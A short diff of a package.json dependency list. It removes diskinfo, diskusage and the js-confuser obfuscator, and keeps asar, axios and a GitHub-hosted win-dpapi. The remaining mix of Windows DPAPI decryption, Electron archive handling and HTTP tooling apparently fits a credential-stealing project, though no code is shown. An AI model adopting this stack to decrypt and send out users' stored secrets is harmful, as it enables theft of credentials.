@@ -18,9 +18,6 @@
     "dependencies": {
         "asar": "^3.2.0",
         "axios": "^1.7.3",
-        "diskinfo": "^0.0.3",
-        "diskusage": "^1.2.0",
-        "js-confuser": "^1.7.1",
         "win-dpapi": "github:k4itrun/win-dpapi"
     }
 }
